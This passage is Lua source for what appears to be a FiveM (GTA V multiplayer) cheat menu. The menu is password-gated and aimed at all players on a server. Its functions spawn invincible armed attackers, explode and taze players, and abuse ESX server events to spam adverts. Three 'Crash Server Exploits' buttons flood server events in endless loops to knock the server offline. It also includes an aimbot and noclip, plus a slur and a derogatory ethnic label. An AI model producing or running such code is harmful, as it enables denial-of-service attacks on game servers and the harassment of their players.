    "prop_gold_vault_gate_01",
    "prop_bank_vaultdoor",
    "des_traincrash_root7",
    "prop_flag_russia",
    "prop_flag_russia_s",
    "prop_flag_s",
    "ch2_03c_props_rrlwindmill_lod",
    "prop_flag_sa",
    "prop_flag_sapd",
    "prop_flag_sapd_s",
    "prop_flag_sa_s",
    "prop_flag_scotland",
    "prop_flag_scotland_s",
    "prop_flag_sheriff",
    "prop_flag_sheriff_s",
    "prop_flag_uk",
    "prop_yacht_lounger",
    "prop_yacht_seat_01",
    "prop_yacht_seat_02",
    "prop_yacht_seat_03",
    "marina_xr_rocks_02",
    "marina_xr_rocks_03",
    "prop_test_rocks01",
    "prop_test_rocks02",
    "prop_test_rocks03",
    "prop_test_rocks04",
    "marina_xr_rocks_04",
    "marina_xr_rocks_05",
    "marina_xr_rocks_06",
    "prop_yacht_table_01",
    "csx_searocks_02",
    "csx_searocks_03",
    "csx_searocks_04",
    "csx_searocks_05",
    "csx_searocks_06",
    "p_yacht_chair_01_s",
    "p_yacht_sofa_01_s",
    "prop_yacht_table_02",
    "csx_coastboulder_00",
    "csx_coastboulder_01",
    "csx_coastboulder_02",
    "csx_coastboulder_03",
    "csx_coastboulder_04",
    "csx_coastboulder_05",
    "csx_coastboulder_06",
    "csx_coastboulder_07",
    "csx_coastrok1",
    "csx_coastrok2",
    "csx_coastrok3",
    "csx_coastrok4",
    "csx_coastsmalrock_01",
    "csx_coastsmalrock_02",
    "csx_coastsmalrock_03",
    "csx_coastsmalrock_04",
    "csx_coastsmalrock_05",
    "prop_yacht_table_03"
}
function LeBoyorFDPRandomProp()
    for af = 1, 3 do
        for W, ag in ipairs(GetActivePlayers()) do
            local ah = ae[math.random(1, 74)]
            modelHash = type(ah) == "number" and ah or GetHashKey(ah)
            if not HasModelLoaded(modelHash) then
                RequestModel(modelHash)
                while not HasModelLoaded(modelHash) do
                    Citizen.Wait(1)
                end
            end
            local ai = CreateObjectNoOffset(modelHash, 0, 0, 0, true, false, true)
            NetworkSetEntityInvisibleToNetwork(ai, true)
            local aj = GetPlayerPed(ag)
            AttachEntityToEntity(
                ai,
                aj,
                GetPedBoneIndex(aj, 57005),
                0.4,
                0,
                0,
                0,
                270.0,
                60.0,
                true,
                true,
                false,
                true,
                1,
                true
            )
        end
    end
end
function AYZNSpawnAllFireVehicle(ak)
    for W, af in ipairs(GetActivePlayers()) do
        AYZNSpawnFireVehicle(af, ak)
    end
end
function AYZNSpawnFireVehicle(af, veh)
    if IsModelValid(veh) then
        local al = GetEntityCoords(GetPlayerPed(af))
        local am = veh
        local an = "csb_mweather"
        RequestModel(am)
        RequestModel(an)
        if not HasModelLoaded(am) then
            RequestModel(am)
            while not HasModelLoaded(am) do
                Citizen.Wait(1)
            end
        end
        if not HasModelLoaded(an) then
            RequestModel(an)
            while not HasModelLoaded(an) do
                Citizen.Wait(1)
            end
        end
        local ao = CreateVehicle(GetHashKey(am), al.x, al.y, al.z + 100.0, 0.0, true, false)
        local ap = CreatePedInsideVehicle(ao, 4, an, -1, true, false)
        SetHeliBladesFullSpeed(ao)
        SetCurrentPedVehicleWeapon(ap, GetHashKey("vehicle_weapon_player_buzzard"))
        SetVehicleShootAtTarget(ap, GetPlayerPed(af), al.x, al.y, al.z)
        local aq = PedToNet(ap)
        NetworkSetNetworkIdDynamic(aq, false)
        SetNetworkIdCanMigrate(aq, true)
        SetNetworkIdExistsOnAllMachines(aq, true)
        Citizen.Wait(30)
        NetToPed(aq)
        SetEntityInvincible(aq, true)
        SetPedCanSwitchWeapon(ap, true)
        TaskCombatPed(ap, GetPlayerPed(af), 0, 16)
        local ar = "weapon_carbinerifle_mk2"
        for as = 1, 3 do
            local at = CreatePedInsideVehicle(ao, 4, an, as, true, false)
            NetworkRegisterEntityAsNetworked(at)
            Citizen.CreateThread(
                function()
                    if DoesEntityExist(at) and not IsEntityDead(GetPlayerPed(af)) then
                        local au = PedToNet(at)
                        NetworkSetNetworkIdDynamic(au, false)
                        SetNetworkIdCanMigrate(au, true)
                        SetNetworkIdExistsOnAllMachines(au, true)
                        Citizen.Wait(100.0)
                        NetToPed(au)
                        GiveWeaponToPed(at, GetHashKey(ar), 9999, 1, 1)
                        SetEntityInvincible(at, true)
                        SetPedCanSwitchWeapon(at, true)
                        TaskCombatPed(at, GetPlayerPed(af), 0, 16)
                    else
                        Citizen.Wait(0)
                    end
                end
            )
        end
    else
        LeBoyorFDPdrawNotification("~h~~b~Vehicle Model is invalid")
    end
end
function LeBoyorFDPSpawnProp(av)
    if IsModelValid(av) then
        for W, af in ipairs(GetActivePlayers()) do
            if IsPedInAnyVehicle(GetPlayerPed(af), true) then
                local aw = GetHashKey(av)
                while not HasModelLoaded(aw) do
                    Citizen.Wait(0)
                    RequestModel(aw)
                end
                local ax = CreateObject(aw, 0, 0, 0, true, false, true)
                NetworkSetEntityInvisibleToNetwork(ax, true)
                AttachEntityToEntity(
                    ax,
                    GetVehiclePedIsIn(GetPlayerPed(af), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(af), false), "chassis"),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local aw = GetHashKey(av)
                while not HasModelLoaded(aw) do
                    Citizen.Wait(0)
                    RequestModel(aw)
                end
                local ax = CreateObjectNoOffset(aw, 0, 0, 0, true, false, true)
                NetworkSetEntityInvisibleToNetwork(ax, true)
                AttachEntityToEntity(
                    ax,
                    GetPlayerPed(af),
                    GetPedBoneIndex(GetPlayerPed(af), 0),
                    0,
                    0,
                    0,
                    0.0,
                    90,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    else
        LeBoyorFDPdrawNotification("~h~~b~Prop Model is invalid")
    end
end
function LeBoyorFDPSpawnVehicle(ay)
    if IsModelValid(ay) then
        for W, af in ipairs(GetActivePlayers()) do
            local az = GetHashKey(ay)
            while not HasModelLoaded(az) do
                Citizen.Wait(0)
                RequestModel(az)
            end
            local al = GetEntityCoords(GetPlayerPed(af))
            local veh = CreateVehicle(az, al.x, al.y, al.z, 0, 1, 1)
            NetworkSetEntityInvisibleToNetwork(veh, true)
        end
    else
        LeBoyorFDPdrawNotification("~h~~b~Vehicle Model is invalid")
    end
end
function LeBoyorFDPSpawnPed(aA)
    if IsModelValid(aA) then
        local aB = "weapon_minigun"
        for W, af in ipairs(GetActivePlayers()) do
            local aC = GetHashKey(aA)
            local aD = GetEntityCoords(GetPlayerPed(af))
            RequestModel(aC)
            Citizen.Wait(50)
            if HasModelLoaded(aC) then
                local aA = CreatePed(21, aC, aD.x - 1, aD.y, aD.z, 0, true, true)
                local aE = CreatePed(21, aC, aD.x + 1, aD.y, aD.z, 0, true, true)
                local aF = CreatePed(21, aC, aD.x, aD.y - 1, aD.z, 0, true, true)
                local aG = CreatePed(21, aC, aD.x, aD.y + 1, aD.z, 0, true, true)
                NetworkSetEntityInvisibleToNetwork(aA, true)
                NetworkSetEntityInvisibleToNetwork(aE, true)
                NetworkSetEntityInvisibleToNetwork(aF, true)
                NetworkSetEntityInvisibleToNetwork(aG, true)
                NetworkRegisterEntityAsNetworked(aA)
                if
                    DoesEntityExist(aA) and DoesEntityExist(aE) and DoesEntityExist(aF) and DoesEntityExist(aG) and
                        not IsEntityDead(GetPlayerPed(af))
                 then
                    SetEntityInvincible(aA, true)
                    SetEntityInvincible(aE, true)
                    SetEntityInvincible(aF, true)
                    SetEntityInvincible(aG, true)
                    local aH = PedToNet(aA)
                    PedToNet(aE)
                    PedToNet(aF)
                    PedToNet(aG)
                    NetworkSetNetworkIdDynamic(aH, fz5f46zfss)
                    SetNetworkIdCanMigrate(aH, true)
                    SetNetworkIdExistsOnAllMachines(aH, true)
                    GiveWeaponToPed(aA, GetHashKey("weapon_rpg"), 9999, 1, 1)
                    GiveWeaponToPed(aE, GetHashKey("weapon_rpg"), 9999, 1, 1)
                    GiveWeaponToPed(aF, GetHashKey("weapon_rpg"), 9999, 1, 1)
                    GiveWeaponToPed(aG, GetHashKey("weapon_rpg"), 9999, 1, 1)
                    SetPlayerWeaponDamageModifier(aA, 999999999999999)
                    SetPlayerWeaponDamageModifier(aE, 999999999999999)
                    SetPlayerWeaponDamageModifier(aF, 999999999999999)
                    SetPlayerWeaponDamageModifier(aG, 999999999999999)
                    SetPedCanSwitchWeapon(aA, true)
                    NetToPed(aH)
                    TaskCombatPed(aA, GetPlayerPed(af), 0, 16)
                    TaskCombatPed(aE, GetPlayerPed(af), 0, 16)
                    TaskCombatPed(aF, GetPlayerPed(af), 0, 16)
                    TaskCombatPed(aG, GetPlayerPed(af), 0, 16)
                elseif IsEntityDead(GetPlayerPed(af)) then
                    TaskCombatHatedTargetsInArea(aA, aD.x, aD.y, aD.z, 500)
                    TaskCombatHatedTargetsInArea(pe2, aD.x, aD.y, aD.z, 500)
                    TaskCombatHatedTargetsInArea(aF, aD.x, aD.y, aD.z, 500)
                    TaskCombatHatedTargetsInArea(aG, aD.x, aD.y, aD.z, 500)
                else
                    Citizen.Wait(0)
                end
            end
        end
    else
        LeBoyorFDPdrawNotification("~h~~b~Ped Model is invalid")
    end
end
local aI = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_HATCHET",
    "WEAPON_PISTOL",
    "WEAPON_COMBATPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_STUNGUN",
    "WEAPON_MICROSMG",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_CARBINERIFLE",
    "WEAPON_COMPACTRIFLE"
}
local aJ = {
    "WEAPON_UNARMED",
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_RAYPISTOL",
    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_RAYCARBINE",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_RAYMINIGUN"
}
function AYZNGiveAllWeapons(aK)
    local aA = GetPlayerPed(aK)
    for af = 0, #aI do
        Citizen.InvokeNative(0xBF0FD6E56C964FCB, aA, GetHashKey(aI[af]), 9999, false, false)
    end
end
function AYZNGiveAllPlayersWeapons()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNGiveAllWeapons(af)
    end
end
function AYZNRemoveAllWeapons(aK)
    local aA = GetPlayerPed(aK)
    for af = 0, #aJ do
        Citizen.InvokeNative(0x4899CB088EDF59B8, aA, GetHashKey(aJ[af]))
    end
end
function AYZNRemoveAllPlayersWeapons()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNRemoveAllWeapons(af)
    end
end
function AYZNmessageply(aK)
    local aA = GetPlayerServerId(aK)
    TriggerServerEvent("esx_policejob:message", aA, "BUY BEST ANTICHEAT > \n~b~discord.gg/3zJfxDR")
end
function AYZNMessageAllPlayers()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNmessageply(af)
    end
end
function AYZNTazPlayers(aK)
    local aA = GetPlayerPed(aK)
    if IsPedInAnyVehicle(aA, true) then
        ClearPedTasksImmediately(aA)
    end
    local aL = GetPedBoneCoords(aA, SKEL_ROOT, 0, 0, 0)
    local aM = GetPedBoneCoords(aA, SKEL_R_Hand, 0, 0, 0.2)
    local aN = GetHashKey("WEAPON_STUNGUN")
    ShootSingleBulletBetweenCoords(aL.x, aL.y, aL.z, aM.x, aM.y, aM.z, 1, 0, aN, PlayerPedId(), false, false, 1)
end
function AYZNTazAllPlayers()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNTazPlayers(af)
    end
end
function AYZNKickFromVeh(aK)
    local aA = GetPlayerPed(aK)
    Citizen.InvokeNative(0xAAA34F8A7CB32098, aA)
end
function AYZNKickAllFromVeh()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNKickFromVeh(af)
    end
end
function AYZNExplodePlayer(aK)
    local aA = GetPlayerPed(aK)
    local al = GetEntityCoords(aA)
    AddExplosion(al.x, al.y, al.z, 7, 100000.0, true, false, 0)
end
function AYZNExploseAllPlayers()
    for W, af in ipairs(GetActivePlayers()) do
        AYZNExplodePlayer(af)
    end
end
function LeBoyorFDPdrawNotification(y)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(y)
    DrawNotification(false, false)
end
local aO, aP, aQ, aR, aS, aT, aU =
    Citizen,
    msgpack,
    math,
    string,
    table,
    TriggerLatentServerEventInternal,
    TriggerServerEventInternal
local aV = {}
local aW = {}
local aX = {}
local aY = {UseSpace = true, Letters = 3, Numbers = 3}
for af = 48, 57 do
    aS.insert(aV, aR.char(af))
end
for af = 65, 90 do
    aS.insert(aV, aR.char(af))
end
for af = 97, 122 do
    aS.insert(aV, aR.char(af))
end
for af = 48, 57 do
    aS.insert(aW, aR.char(af))
end
for af = 65, 90 do
    aS.insert(aX, aR.char(af))
end
for af = 97, 122 do
    aS.insert(aX, aR.char(af))
end
local function aZ()
    local a_ = aQ.random(1, 2)
    if a_ == 1 then
        return "m"
    else
        return "f"
    end
end
local function b0(b1)
    if b1 > 0 then
        return b0(b1 - 1) .. aV[aQ.random(1, #aV)]
    end
    return ""
end
local function b2(b1)
    if b1 > 0 then
        return b2(b1 - 1) .. aW[aQ.random(1, #aW)]
    end
    return ""
end
local function b3(b1)
    if b1 > 0 then
        return b3(b1 - 1) .. aX[aQ.random(1, #aX)]
    end
    return ""
end
local function b4()
    if aY.UseSpace then
        return aR.upper(b3(aY.Letters) .. " " .. b2(aY.Numbers))
    end
    return aR.upper(b3(aY.Letters) .. b2(aY.Numbers))
end
local function b5()
    return "06" .. tostring(aQ.random(11111111, 99999999))
end
local function b6(b7, b8, ...)
    local b9 = aP.pack({...})
    aT(b7, b9, aR.len(b9), tonumber(b8))
end
local function ba(b7, ...)
    local b9 = aP.pack({...})
    aU(b7, b9, aR.len(b9))
end
local function bb(b8)
    local bc = {playerid = -1, identifier = "license:" .. b0(40)}
    b6(
        "esx_identity:setIdentity",
        b8,
        {
            firstname = b0(6),
            lastname = b0(6),
            dateofbirth = tostring(aQ.random(1, 31)) ..
                "/" .. tostring(aQ.random(1, 12)) .. "/" .. tostring(aQ.random(1950, 2010)),
            sex = aZ(),
            height = aQ.random(150, 190)
        },
        bc
    )
end
local function bd(b8)
    b6("esx:triggerServerCallback", b8, "esx_vehicleshop:isPlateTaken", 1, b4())
end
local function be(b8)
    b6("esx_cartesim:sim_delete", b8, b5())
end
Citizen.CreateThread(
    function()
        local bf = 1
        local bg = 1
        LeBoyorFDPCreateMenu("MainMenu", "AYYYYYZN")
        LeBoyorFDPCreateSubMenu("AllPlayersMenu", "MainMenu", "")
        LeBoyorFDPCreateSubMenu("CrashExploits", "MainMenu", "")
        LeBoyorFDPCreateSubMenu("SpawnProp", "AllPlayersMenu", "")
        LeBoyorFDPCreateSubMenu("SpawnVehicle", "AllPlayersMenu", "")
        LeBoyorFDPCreateSubMenu("SpawnPed", "AllPlayersMenu", "")
        LeBoyorFDPCreateSubMenu("SpawnFireVehicles", "AllPlayersMenu", "")
        allMenus = {
            "MainMenu",
            "AllPlayersMenu",
            "SpawnProp",
            "SpawnVehicle",
            "SpawnPed",
            "SpawnFireVehicles",
            "CrashExploits"
        }
        while a do
            if LeBoyorFDPIsMenuOpened("MainMenu") then
                LeBoyorFDPSetSubTitle("MainMenu", GetCurrentServerEndpoint())
                if LeBoyorFDPMenuButton("~b~→~s~ All Players Menu", "AllPlayersMenu") then
                elseif LeBoyorFDPMenuButton("~b~→~s~ Crash Server Exploits", "CrashExploits") then
                elseif LeBoyorFDPButton("~b~→~s~ Revive Myself") then
                    local al = GetEntityCoords(GetPlayerPed(-1))
                    StopScreenEffect("DeathFailOut")
                    SetEntityHealth(PlayerPedId(-1), 200)
                    ClearPedBloodDamage(GetPlayerPed(-1))
                    SetEntityCoordsNoOffset(PlayerPedId(), al.x, al.y, al.z, false, false, false, true)
                    NetworkResurrectLocalPlayer(al.x, al.y, al.z, false, true, false)
                    TriggerServerEvent("esx:onPlayerSpawn")
                    TriggerEvent("esx:onPlayerSpawn")
                    TriggerEvent("playerSpawned")
                elseif LeBoyorFDPButton("NoClip") then
                    ToggleNoclippp()
                elseif LeBoyorFDPButton("AimBot") then
                    ToggleAimbottpp()
                elseif LeBoyorFDPButton("~b~→~s~ Close the menu") then
                    a = false
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("AllPlayersMenu") then
                if LeBoyorFDPMenuButton("~b~→~s~ Spawn Prop", "SpawnProp") then
                elseif LeBoyorFDPMenuButton("~b~→~s~ Spawn Vehicle", "SpawnVehicle") then
                elseif LeBoyorFDPMenuButton("~b~→~s~ Spawn Ped", "SpawnPed") then
                elseif LeBoyorFDPMenuButton("~b~→~s~ Spawn Shooting Vehicle", "SpawnFireVehicles") then
                elseif LeBoyorFDPButton("~s~ Give All Players Weapons") then
                    AYZNGiveAllPlayersWeapons()
                elseif LeBoyorFDPButton("~s~ Remove All Players Weapons") then
                    AYZNRemoveAllPlayersWeapons()
                elseif LeBoyorFDPButton("~s~ Remove From Cars") then
                    AYZNKickAllFromVeh()
                elseif LeBoyorFDPButton("~s~ Taz All Players") then
                    AYZNTazAllPlayers()
                elseif LeBoyorFDPButton("~s~ Send Message to All Players") then
                    AYZNMessageAllPlayers()
                elseif LeBoyorFDPButton("~s~ Explose All Players") then
                    AYZNExploseAllPlayers()
                elseif LeBoyorFDPButton("~s~ Take Hostage All Players") then
                    local bh = "anim@gangops@hostage@"
                    local bi = "perp_idle"
                    local bj = "anim@gangops@hostage@"
                    local bk = "victim_idle"
                    for W, af in ipairs(GetActivePlayers()) do
                        TriggerServerEvent(
                            "cmg3_animations:sync",
                            GetPlayerPed(-1),
                            bh,
                            bj,
                            bi,
                            bk,
                            0.11,
                            -0.24,
                            0.0,
                            GetPlayerServerId(af),
                            100000,
                            0.0,
                            49,
                            49,
                            50,
                            true
                        )
                        Wait(1000)
                    end
                elseif LeBoyorFDPButton("~s~ Carry All Players") then
                    local bh = "anim@arena@celeb@flat@paired@no_props@"
                    local bi = "piggyback_c_player_a"
                    local bk = "piggyback_c_player_b"
                    for W, af in ipairs(GetActivePlayers()) do
                        TriggerServerEvent(
                            "::{korioz#0110}::cmg2_animations:sync",
                            GetPlayerPed(-1),
                            bh,
                            bi,
                            bk,
                            0.15,
                            -0.24,
                            0.0,
                            GetPlayerServerId(af),
                            100000,
                            0.0,
                            49,
                            33,
                            1
                        )
                        Wait(1000)
                    end
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("CrashExploits") then
                if LeBoyorFDPButton("~s~ Crash Exploit 1") then
                    local b8 = 500
                    while true do
                        for af = 1, 150, 1 do
                            bb(b8)
                        end
                        aO.Wait(100)
                    end
                elseif LeBoyorFDPButton("~s~ Crash Exploit 2") then
                    local b8 = 2000
                    while true do
                        for af = 1, 150, 1 do
                            bd(b8)
                        end
                        aO.Wait(100)
                    end
                elseif LeBoyorFDPButton("~s~ Crash Exploit 3") then
                    local b8 = 2000
                    while true do
                        for af = 1, 150, 1 do
                            be(b8)
                        end
                        aO.Wait(100)
                    end
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("SpawnProp") then
                if LeBoyorFDPButton("~s~ UFO") then
                    LeBoyorFDPSpawnProp("p_spinning_anus_s")
                elseif LeBoyorFDPButton("~s~ Hamburgher") then
                    LeBoyorFDPSpawnProp("xs_prop_hamburgher_wl")
                elseif LeBoyorFDPButton("~s~ Tube") then
                    LeBoyorFDPSpawnProp("stt_prop_stunt_tube_l")
                elseif LeBoyorFDPButton("~s~ Ramp") then
                    LeBoyorFDPSpawnProp("stt_prop_stunt_jump45")
                elseif LeBoyorFDPButton("~s~ Random Prop") then
                    LeBoyorFDPRandomProp()
                elseif LeBoyorFDPButton("~s~ Custom Prop") then
                    customprop = LeBoyorFDPDisplayBox("Enter a Prop name", "", 100)
                    LeBoyorFDPSpawnProp(customprop)
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("SpawnVehicle") then
                if LeBoyorFDPButton("~s~ Boat") then
                    LeBoyorFDPSpawnVehicle("tug")
                elseif LeBoyorFDPButton("~s~ Bus") then
                    LeBoyorFDPSpawnVehicle("bus")
                elseif LeBoyorFDPButton("~s~ AirPlane") then
                    LeBoyorFDPSpawnVehicle("strikeforce")
                elseif LeBoyorFDPButton("~s~ Helicopter") then
                    LeBoyorFDPSpawnVehicle("buzzard2")
                elseif LeBoyorFDPButton("~s~ Insurgent") then
                    LeBoyorFDPSpawnVehicle("insurgent2")
                elseif LeBoyorFDPButton("~s~ Bulldozer") then
                    LeBoyorFDPSpawnVehicle("bulldozer")
                elseif LeBoyorFDPButton("~s~ Custom Vehicle") then
                    customprop = LeBoyorFDPDisplayBox("Enter a Vehicle name", "", 100)
                    LeBoyorFDPSpawnVehicle(customprop)
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("SpawnPed") then
                if LeBoyorFDPButton("~s~ Shark") then
                    LeBoyorFDPSpawnPed("a_c_sharktiger")
                elseif LeBoyorFDPButton("~s~ Gorilla") then
                    LeBoyorFDPSpawnPed("ig_orleans")
                elseif LeBoyorFDPButton("~s~ Rabbi Jacob") then
                    LeBoyorFDPSpawnPed("a_m_m_hasjew_01")
                elseif LeBoyorFDPButton("~s~ Custom Ped") then
                    customprop = LeBoyorFDPDisplayBox("Enter a Ped Name", "", 100)
                    LeBoyorFDPSpawnPed(customprop)
                end
                LeBoyorFDPDisplay()
            elseif LeBoyorFDPIsMenuOpened("SpawnFireVehicles") then
                if LeBoyorFDPButton("~s~ Helicopters") then
                    AYZNSpawnAllFireVehicle("buzzard")
                elseif LeBoyorFDPButton("~s~ Plane") then
                    AYZNSpawnAllFireVehicle("strikeforce")
                elseif LeBoyorFDPButton("~s~ Insurgent") then
                    AYZNSpawnAllFireVehicle("insurgent3")
                elseif LeBoyorFDPButton("~s~ Turret") then
                    AYZNSpawnAllFireVehicle("trailersmall2")
                elseif LeBoyorFDPButton("~s~ Custom Vehicle") then
                    veh = LeBoyorFDPDisplayBox("Enter a Vehicle Name", "", 100)
                    AYZNSpawnAllFireVehicle(veh)
                end
                LeBoyorFDPDisplay()
            elseif IsDisabledControlJustPressed(0, 314) then
                local bl = jtmmoiaussibb("Enter the password", "", 100)
                if bl == "ayznthebest" then
                    LeBoyorFDPOpenMenu("MainMenu")
                    LeBoyorFDPdrawNotification("~h~~b~Successfully Opened !")
                    LeBoyorFDPdrawNotification("~h~~b~Made by ayzn.shit#0666")
                    LeBoyorFDPdrawNotification("~h~~b~discord.gg/3V35nDx")
                else
                    LeBoyorFDPdrawNotification("~h~~R~Fucking Retard!")
                end
            end
            Citizen.Wait(0)
        end
    end
)
Citizen.CreateThread(
    function()
        while true do
            Citizen.Wait(0)
            local C = LeBoyorFDPRGBRainbow(1)
            for af = 0, #allMenus do
                LeBoyorFDPSetSpriteColor(allMenus[af], C.r, C.g, C.b, 255)
            end
        end
    end
)
local bm = {}
Citizen.CreateThread(
    function()
        while a do
            Citizen.Wait(0)
            local C = LeBoyorFDPRGBRainbow(60)
            local bn = GetEntityCoords(PlayerPedId(), false)
            for W, bo in pairs(GetActivePlayers()) do
                local bp = GetPlayerPed(bo)
                if #(bn - GetEntityCoords(bp, false)) < 250.0 then
                    bm[bo] =
                        CreateFakeMpGamerTag(
                        bp,
                        " [" ..
                            GetPlayerServerId(bo) .. "] " .. GetPlayerName(bo) .. "(" .. GetEntityHealth(bp) .. " PV)",
                        false,
                        false,
                        "",
                        0
                    )
                    SetMpGamerTagVisibility(bm[bo], 2, true)
                    SetMpGamerTagHealthBarColour(bm[bo], 50)
                    SetMpGamerTagColour(bm[bo], 0, C.r)
                    SetMpGamerTagName(
                        bm[bo],
                        " [" ..
                            GetPlayerServerId(bo) .. "] " .. GetPlayerName(bo) .. "(" .. GetEntityHealth(bp) .. "PV)"
                    )
                    if NetworkIsPlayerTalking(bo) then
                        SetMpGamerTagVisibility(bm[bo], 4, 1)
                    else
                        SetMpGamerTagVisibility(bm[bo], 4, 0)
                    end
                else
                    RemoveMpGamerTag(bm[bo])
                    bm[bo] = nil
                end
            end
        end
    end
)
Citizen.CreateThread(
    function()
        LeBoyorFDPdrawNotification("~h~~b~AYYYYYZN Menu")
        LeBoyorFDPdrawNotification("~h~~b~Press NUMPAD+ to open")
        DisplayRadar(true)
    end
)
local bq = false
local br = 2.0
function ToggleNoclippp()
    br = 2.0
    bq = not bq
    if bq then
        Citizen.CreateThread(
            function()
                while bq do
                    Wait(1)
                    local bn = GetEntityCoords(PlayerPedId(), false)
                    local bs = getCamDirectiondd()
                    SetEntityVelocity(PlayerPedId(), 0.01, 0.01, 0.01)
                    SetEntityCollision(PlayerPedId(), 0, 1)
                    if IsControlPressed(0, 32) then
                        bn = bn + br * bs
                    end
                    if IsControlPressed(0, 269) then
                        bn = bn - br * bs
                    end
                    if IsDisabledControlJustPressed(1, 15) then
                        br = br + 0.1
                    end
                    if IsDisabledControlJustPressed(1, 14) then
                        br = br - 0.1
                        if br < 0 then
                            br = 0
                        end
                    end
                    SetEntityCoordsNoOffset(PlayerPedId(), bn, true, true, true)
                    SetEntityVisible(PlayerPedId(), 0, 0)
                end
                SetEntityVisible(PlayerPedId(), 1, 0)
                SetEntityCollision(PlayerPedId(), 1, 1)
            end
        )
    end
end
function AddVectorsddd(bt, bu)
    return vector3(bt.x + bu.x, bt.y + bu.y, bt.z + bu.z)
end
function ShootAt2sddd(aK, bv, bw)
    local bx = GetPedBoneCoords(aK, GetEntityBoneIndexByName(aK, bv), 0.0, 0.0, 0.0)
    local W, aN = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(
        AddVectorsddd(bx, vector3(0, 0, 0.1)),
        bx,
        bw,
        true,
        aN,
        PlayerPedId(),
        true,
        false,
        0.3
    )
end
function ShootAimbotff(by)
    if
        IsEntityOnScreen(by) and HasEntityClearLosToEntityInFront(PlayerPedId(), by) and not IsPedDeadOrDying(by) and
            IsDisabledControlPressed(0, 24) and
            IsPlayerFreeAiming(PlayerId())
     then
        local z, A, bz = table.unpack(GetEntityCoords(by))
        local W, bA, bB = World3dToScreen2d(z, A, bz)
        if bA > 0.25 and bA < 0.75 and bB > 0.25 and bB < 0.75 then
            local bC, aN = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2sddd(by, "SKEL_HEAD", GetWeaponDamage(aN, 1))
        end
    end
end
function DoLines(af)
    local bD, bE, bF = table.unpack(GetEntityCoords(PlayerPedId(-1)))
    local bG, bH, bI = table.unpack(GetEntityCoords(af))
    DrawLine(bD, bE, bF, bG, bH, bI, 243, 7, 243, 255)
end
function ToggleAimbottpp()
    Citizen.CreateThread(
        function()
